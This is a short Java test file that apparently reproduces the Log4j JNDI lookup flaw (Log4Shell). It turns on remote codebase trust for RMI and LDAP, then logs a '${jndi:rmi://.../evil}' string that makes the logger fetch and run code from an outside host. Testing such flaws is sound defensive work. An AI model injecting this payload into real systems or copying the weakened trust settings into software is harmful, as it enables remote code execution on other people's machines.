package com.cdtft.rmi;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author: wangcheng
 * @date: 2021年12月13 10:26
 */
public class BugTest {

    public static final Logger logger = LogManager.getLogger();

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");

        logger.info("Hello: {}", "world");
        logger.info("Hello: {}", "${java:os}");
        logger.info("Hello: {}", "${jndi:rmi://192.168.8.32:1099/evil}");
    }

}
